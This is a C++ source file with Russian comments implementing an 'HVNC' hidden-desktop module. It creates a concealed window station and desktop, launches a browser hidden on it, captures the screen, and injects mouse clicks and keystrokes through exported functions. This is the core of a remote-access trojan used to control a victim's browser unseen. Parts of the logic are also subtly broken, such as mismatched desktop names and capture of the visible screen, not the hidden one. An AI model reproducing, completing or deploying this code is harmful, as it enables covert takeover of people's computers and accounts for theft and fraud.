#include <windows.h>
#include <winuser.h>
#include <string>
#include <memory>
#include "../common.h"
#include "../logger/file_logger.h"

// Определяем DESKTOP_ALL_ACCESS если не определено
#ifndef DESKTOP_ALL_ACCESS
#define DESKTOP_ALL_ACCESS (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | \
                           DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | \
                           DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK | \
                           DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | \
                           DESKTOP_SWITCHDESKTOP | STANDARD_RIGHTS_REQUIRED)
#endif

// Простая конвертация строк
std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

class HiddenDesktop {
private:
    HDESK hDesktop;
    HWINSTA hWinStation;
    std::wstring desktopName;
    std::wstring winStationName;
    
public:
    HiddenDesktop() : hDesktop(nullptr), hWinStation(nullptr) {
        // Генерируем случайные имена
        desktopName = L"WinSta0\\Default_" + GenerateRandomString(8);
        winStationName = L"WinSta_" + GenerateRandomString(6);
    }
    
    ~HiddenDesktop() {
        CleanupDesktop();
    }
    
    bool CreateHiddenDesktop() {
        LogInfo("Создание скрытого рабочего стола...");
        
        // Создаем новую оконную станцию
        SECURITY_ATTRIBUTES sa = {0};
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        
        hWinStation = CreateWindowStationW(
            winStationName.c_str(),
            0,
            WINSTA_ALL_ACCESS,
            &sa
        );
        
        if (!hWinStation) {
            LogError("Не удалось создать оконную станцию");
            return false;
        }
        
        // Устанавливаем созданную станцию как активную
        if (!SetProcessWindowStation(hWinStation)) {
            LogError("Не удалось установить оконную станцию");
            return false;
        }
        
        // Создаем новый рабочий стол
        hDesktop = CreateDesktopW(
            L"HiddenDesktop",
            NULL,
            NULL,
            0,
            DESKTOP_ALL_ACCESS,
            &sa
        );
        
        if (!hDesktop) {
            LogError("Не удалось создать скрытый рабочий стол");
            return false;
        }
        
        // Устанавливаем созданный рабочий стол как активный для текущего потока
        if (!SetThreadDesktop(hDesktop)) {
            LogError("Не удалось установить рабочий стол для потока");
            return false;
        }
        
        LogInfo("Скрытый рабочий стол успешно создан");
        return true;
    }
    
    bool StartProcessOnDesktop(const std::wstring& applicationPath, const std::wstring& parameters = L"") {
        if (!hDesktop) {
            LogError("Рабочий стол не создан");
            return false;
        }
        
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        
        si.cb = sizeof(STARTUPINFOW);
        si.lpDesktop = const_cast<LPWSTR>(L"HiddenDesktop");
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        std::wstring commandLine = applicationPath;
        if (!parameters.empty()) {
            commandLine += L" " + parameters;
        }
        
        BOOL result = CreateProcessW(
            NULL,
            const_cast<LPWSTR>(commandLine.c_str()),
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE | DETACHED_PROCESS,
            NULL,
            NULL,
            &si,
            &pi
        );
        
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            LogInfo("Процесс успешно запущен на скрытом рабочем столе");
            return true;
        } else {
            LogError("Не удалось запустить процесс на скрытом рабочем столе");
            return false;
        }
    }
    
    bool CaptureDesktopImage(std::vector<uint8_t>& imageData) {
        if (!hDesktop) return false;
        
        // Получаем DC рабочего стола
        HDC hDesktopDC = GetDC(NULL);
        if (!hDesktopDC) return false;
        
        // Получаем размеры экрана
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        // Создаем совместимый DC и bitmap
        HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        
        // Копируем содержимое экрана
        BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);
        
        // Получаем данные bitmap
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight; // Отрицательное значение для правильной ориентации
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        int imageSize = screenWidth * screenHeight * 3;
        imageData.resize(imageSize);
        
        int result = GetDIBits(hDesktopDC, hBitmap, 0, screenHeight, 
                              imageData.data(), &bmi, DIB_RGB_COLORS);
        
        // Очистка ресурсов
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hDesktopDC);
        
        return result > 0;
    }
    
    bool InjectMouseClick(int x, int y, bool leftButton = true) {
        if (!hDesktop) return false;
        
        // Переключаемся на наш рабочий стол
        HDESK hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
        SetThreadDesktop(hDesktop);
        
        // Устанавливаем позицию курсора
        SetCursorPos(x, y);
        
        // Эмулируем клик мыши
        DWORD downEvent = leftButton ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTDOWN;
        DWORD upEvent = leftButton ? MOUSEEVENTF_LEFTUP : MOUSEEVENTF_RIGHTUP;
        
        mouse_event(downEvent, x, y, 0, 0);
        Sleep(50); // Небольшая задержка
        mouse_event(upEvent, x, y, 0, 0);
        
        // Возвращаемся на оригинальный рабочий стол
        SetThreadDesktop(hOriginalDesktop);
        
        return true;
    }
    
    bool InjectKeyboardInput(const std::wstring& text) {
        if (!hDesktop) return false;
        
        // Переключаемся на наш рабочий стол
        HDESK hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
        SetThreadDesktop(hDesktop);
        
        // Эмулируем ввод текста
        for (wchar_t ch : text) {
            // Для простых символов
            if (ch >= L'A' && ch <= L'Z') {
                keybd_event(VK_SHIFT, 0, 0, 0);
                keybd_event(ch, 0, 0, 0);
                keybd_event(ch, 0, KEYEVENTF_KEYUP, 0);
                keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
            } else if (ch >= L'a' && ch <= L'z') {
                keybd_event(ch - L'a' + L'A', 0, 0, 0);
                keybd_event(ch - L'a' + L'A', 0, KEYEVENTF_KEYUP, 0);
            } else if (ch >= L'0' && ch <= L'9') {
                keybd_event(ch, 0, 0, 0);
                keybd_event(ch, 0, KEYEVENTF_KEYUP, 0);
            } else {
                // Для специальных символов используем Unicode
                keybd_event(VK_MENU, 0, 0, 0);
                keybd_event(VK_NUMPAD0 + (ch / 1000), 0, 0, 0);
                keybd_event(VK_NUMPAD0 + ((ch / 100) % 10), 0, 0, 0);
                keybd_event(VK_NUMPAD0 + ((ch / 10) % 10), 0, 0, 0);
                keybd_event(VK_NUMPAD0 + (ch % 10), 0, 0, 0);
                keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
            }
            
            Sleep(10); // Небольшая задержка между символами
        }
        
        // Возвращаемся на оригинальный рабочий стол
        SetThreadDesktop(hOriginalDesktop);
        
        return true;
    }
    
    bool InjectSpecialKey(int virtualKey, bool ctrlPressed = false, bool altPressed = false, bool shiftPressed = false) {
        if (!hDesktop) return false;
        
        // Переключаемся на наш рабочий стол
        HDESK hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
        SetThreadDesktop(hDesktop);
        
        // Нажимаем модификаторы
        if (ctrlPressed) keybd_event(VK_CONTROL, 0, 0, 0);
        if (altPressed) keybd_event(VK_MENU, 0, 0, 0);
        if (shiftPressed) keybd_event(VK_SHIFT, 0, 0, 0);
        
        // Нажимаем основную клавишу
        keybd_event(virtualKey, 0, 0, 0);
        keybd_event(virtualKey, 0, KEYEVENTF_KEYUP, 0);
        
        // Отпускаем модификаторы
        if (shiftPressed) keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
        if (altPressed) keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
        if (ctrlPressed) keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
        
        // Возвращаемся на оригинальный рабочий стол
        SetThreadDesktop(hOriginalDesktop);
        
        return true;
    }
    
    HDESK GetDesktopHandle() const {
        return hDesktop;
    }
    
    HWINSTA GetWindowStationHandle() const {
        return hWinStation;
    }
    
private:
    void CleanupDesktop() {
        if (hDesktop) {
            CloseDesktop(hDesktop);
            hDesktop = nullptr;
        }
        
        if (hWinStation) {
            CloseWindowStation(hWinStation);
            hWinStation = nullptr;
        }
    }
    
    std::wstring GenerateRandomString(size_t length) {
        const wchar_t charset[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        std::wstring result;
        result.reserve(length);
        
        for (size_t i = 0; i < length; ++i) {
            result += charset[rand() % (sizeof(charset) / sizeof(charset[0]) - 1)];
        }
        
        return result;
    }
};

// Глобальный экземпляр скрытого рабочего стола
static std::unique_ptr<HiddenDesktop> g_hiddenDesktop;

// Экспортные функции
extern "C" {
    bool CreateHiddenDesktop() {
        try {
            g_hiddenDesktop = std::make_unique<HiddenDesktop>();
            bool success = g_hiddenDesktop->CreateHiddenDesktop();
            
            if (!success) {
                g_hiddenDesktop.reset();
                return false;
            }
            
            LogInfo("HVNC: Скрытый рабочий стол создан");
            return true;
            
        } catch (...) {
            LogError("HVNC: Исключение при создании рабочего стола");
            g_hiddenDesktop.reset();
            return false;
        }
    }
    
    bool StartBrowserOnHiddenDesktop(const char* browserPath) {
        if (!g_hiddenDesktop) return false;
        
        std::wstring wBrowserPath = StringToWString(browserPath);
        return g_hiddenDesktop->StartProcessOnDesktop(wBrowserPath);
    }
    
    bool CaptureHiddenDesktopImage(uint8_t** imageData, int* imageSize) {
        if (!g_hiddenDesktop || !imageData || !imageSize) return false;
        
        static std::vector<uint8_t> capturedImage;
        
        if (g_hiddenDesktop->CaptureDesktopImage(capturedImage)) {
            *imageData = capturedImage.data();
            *imageSize = (int)capturedImage.size();
            return true;
        }
        
        return false;
    }
    
    bool InjectMouseClickHVNC(int x, int y, bool leftButton) {
        if (!g_hiddenDesktop) return false;
        return g_hiddenDesktop->InjectMouseClick(x, y, leftButton);
    }
    
    bool InjectKeyboardInputHVNC(const char* text) {
        if (!g_hiddenDesktop) return false;
        
        std::wstring wText = StringToWString(text);
        return g_hiddenDesktop->InjectKeyboardInput(wText);
    }
    
    bool InjectSpecialKeyHVNC(int virtualKey, bool ctrl, bool alt, bool shift) {
        if (!g_hiddenDesktop) return false;
        return g_hiddenDesktop->InjectSpecialKey(virtualKey, ctrl, alt, shift);
    }
    
    void DestroyHiddenDesktop() {
        if (g_hiddenDesktop) {
            LogInfo("HVNC: Уничтожение скрытого рабочего стола");
            g_hiddenDesktop.reset();
        }
    }
}